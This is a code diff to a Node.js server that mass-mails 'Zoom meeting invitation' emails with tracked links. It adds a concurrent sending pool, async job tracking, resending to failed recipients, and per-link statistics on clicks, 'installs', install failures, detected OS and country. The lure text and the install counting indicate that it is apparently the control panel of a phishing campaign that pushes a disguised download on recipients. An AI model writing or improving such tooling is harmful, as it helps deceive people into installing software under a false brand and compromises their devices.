@@ -146,6 +146,76 @@ function funnelData() {
   };
 }
 
+// --- send dispatcher (concurrency pool + async jobs) ----------------------
+const JOBS = path.join(DATA_DIR, 'jobs.json');
+function readJobs() { return readJson(JOBS, {}); }
+function writeJobs(j) { writeJson(JOBS, j); }
+function newJob(total) {
+  const id = crypto.randomBytes(6).toString('hex');
+  const j = readJobs();
+  j[id] = { id, status: 'running', total, done: 0, sent: 0, failed: 0, started: new Date().toISOString(), updated: new Date().toISOString() };
+  writeJobs(j);
+  return id;
+}
+function updateJob(id, patch) {
+  const j = readJobs();
+  if (!j[id]) return;
+  Object.assign(j[id], patch, { updated: new Date().toISOString() });
+  if (j[id].status === 'running' && j[id].done >= j[id].total) j[id].status = 'done';
+  writeJobs(j);
+}
+function pruneJobs() {
+  const j = readJobs();
+  const ids = Object.keys(j).sort((a, b) => String(j[b].started).localeCompare(String(j[a].started)));
+  for (const id of ids.slice(200)) delete j[id];
+  writeJobs(j);
+}
+async function runPool(items, worker, concurrency) {
+  const list = items.slice();
+  let i = 0;
+  const n = Math.max(1, Math.min(concurrency, list.length || 1));
+  const workers = Array.from({ length: n }, async () => {
+    for (;;) {
+      const idx = i++;
+      if (idx >= list.length) return;
+      await worker(list[idx]);
+    }
+  });
+  await Promise.all(workers);
+}
+async function dispatchEmails(linkId, emails, subject, intro, opts = {}) {
+  const concurrency = Math.max(1, Math.min(opts.concurrency || 5, 12));
+  const target = PUBLIC + '/t/' + linkId;
+  const buffer = [];
+  let sent = 0, failed = 0;
+  await runPool(emails, async (to) => {
+    const r = await sendInviteEmail(to, subject, intro, target);
+    if (r && r.sent) sent++; else failed++;
+    buffer.push({ ts: new Date().toISOString(), id: linkId, to, sent: !!(r && r.sent), reason: (r && r.reason) || '' });
+    if (buffer.length >= 40) appendMany(SENDS, buffer.splice(0, buffer.length));
+    if (opts.jobId) updateJob(opts.jobId, { done: sent + failed, sent, failed });
+  }, concurrency);
+  appendMany(SENDS, buffer.splice(0, buffer.length));
+  return { sent, failed };
+}
+function linkHistory() {
+  const db = readDb();
+  const sends = readJson(SENDS, []);
+  const byId = {};
+  for (const s of sends) {
+    const b = byId[s.id] || (byId[s.id] = { sent: 0, failed: 0 });
+    if (s.sent) b.sent++; else b.failed++;
+  }
+  return Object.entries(db).map(([id, e]) => ({
+    id, created: e.created, service: e.service, co: e.co, who: e.who, src: e.src, os: e.os,
+    recipients: e.recipients || 0,
+    emails_stored: Array.isArray(e.emails) ? e.emails.length : 0,
+    clicks: e.clicks || 0, installs: e.installs || 0, installs_fail: e.installs_fail || 0,
+    detected_os: e.detected_os || '', detected_cc: e.detected_cc || '',
+    sends_sent: (byId[id] || {}).sent || 0, sends_failed: (byId[id] || {}).failed || 0
+  })).sort((a, b) => String(b.created).localeCompare(String(a.created)));
+}
+
 function normalizeEmails(value) {
   const list = String(value || '').split(/[\s,;]+/).map((v) => v.trim().toLowerCase()).filter(Boolean);
   const seen = new Set();
@@ -588,6 +658,51 @@ const server = http.createServer(async (req, res) => {
     const sent = rows.filter((s) => s.sent).length;
     return json(res, 200, { total: rows.length, sent, failed: rows.length - sent, recent: rows.slice(-100).reverse() });
   }
+  if (url.pathname === '/api/history') {
+    const limit = Math.min(parseInt(url.searchParams.get('limit') || '100', 10) || 100, 500);
+    return json(res, 200, { links: linkHistory().slice(0, limit) });
+  }
+  if (url.pathname === '/api/job') {
+    const id = String(url.searchParams.get('id') || '');
+    const job = readJobs()[id];
+    return job ? json(res, 200, job) : json(res, 404, { error: 'no such job' });
+  }
+  if (url.pathname === '/api/jobs') {
+    const jobs = Object.values(readJobs()).sort((a, b) => String(b.started).localeCompare(String(a.started)));
+    return json(res, 200, { jobs: jobs.slice(0, 50) });
+  }
+  if (url.pathname === '/api/resend' && req.method === 'POST') {
+    try {
+      const body = await collectBody(req);
+      const id = safeText(body.id, 32);
+      const db = readDb();
+      const entry = db[id];
+      if (!entry) return json(res, 404, { error: 'No such link.' });
+      let emails = Array.isArray(entry.emails) && entry.emails.length ? entry.emails : normalizeEmails(body.emails);
+      if (!emails.length) return json(res, 400, { error: 'No stored recipients and none supplied.' });
+      const only = safeText(body.only, 16);
+      if (only === 'failed') {
+        const failed = new Set(readJson(SENDS, []).filter((s) => s.id === id && !s.sent).map((s) => s.to));
+        if (failed.size) emails = emails.filter((e) => failed.has(e));
+      }
+      const subject = safeText(body.subject, 140) || entry.subject || 'Zoom meeting invitation';
+      const intro = safeText(body.message, 400) || entry.intro ||
+        'You are invited to a Zoom Private meeting. Open the link below; the page detects your device and prepares the correct client automatically.';
+      const wantAsync = body.async === true || body.async === '1' || emails.length > 150;
+      if (wantAsync) {
+        const jobId = newJob(emails.length);
+        dispatchEmails(id, emails, subject, intro, { jobId })
+          .then(() => updateJob(jobId, { status: 'done' }))
+          .catch((e) => updateJob(jobId, { status: 'error', reason: String(e.message || e) }));
+        pruneJobs();
+        return json(res, 202, { id, recipients: emails.length, job: jobId, async: true, only: only || 'all' });
+      }
+      const r = await dispatchEmails(id, emails, subject, intro);
+      return json(res, 200, { id, recipients: emails.length, sent_ok: r.sent, sent_failed: r.failed, only: only || 'all' });
+    } catch (e) {
+      return json(res, 400, { error: String(e.message || e) });
+    }
+  }
   if (url.pathname.startsWith('/t/')) {
     const id = url.pathname.slice(3);
     const db = readDb();
@@ -768,23 +883,26 @@ const server = http.createServer(async (req, res) => {
       const db = readDb();
       db[id] = {
         target: base, service, recipients: recipients.length, who, co, src, os,
+        emails: recipients, subject, intro,
         created: new Date().toISOString(), clicks: 0
       };
       writeDb(db);
       const link = buildLinks(service, recipients, target, subject, intro);
-      const sendResults = [];
-      const sendRows = [];
-      for (const r of recipients) {
-        const result = await sendInviteEmail(r, subject, intro, target);
-        sendRows.push({ ts: new Date().toISOString(), id, to: r, sent: !!result.sent, reason: result.reason || '' });
-        sendResults.push({ to: r, ...result });
+
+      const wantAsync = body.async === true || body.async === '1' || recipients.length > 150;
+      if (wantAsync) {
+        const jobId = newJob(recipients.length);
+        dispatchEmails(id, recipients, subject, intro, { jobId })
+          .then(() => updateJob(jobId, { status: 'done' }))
+          .catch((e) => updateJob(jobId, { status: 'error', reason: String(e.message || e) }));
+        pruneJobs();
+        return json(res, 202, { id, target, service, recipients: recipients.length, link, subject, job: jobId, async: true });
       }
-      appendMany(SENDS, sendRows);
+
+      const r = await dispatchEmails(id, recipients, subject, intro);
       return json(res, 200, {
-        id, target, service, recipients, link, subject,
-        sent_ok: sendRows.filter((s) => s.sent).length,
-        sent_failed: sendRows.filter((s) => !s.sent).length,
-        body: intro + '\n\n' + target, sent: sendResults
+        id, target, service, recipients: recipients.length, link, subject,
+        sent_ok: r.sent, sent_failed: r.failed, body: intro + '\n\n' + target
       });
     } catch (error) {
       return json(res, 400, { error: String(error.message || error) });
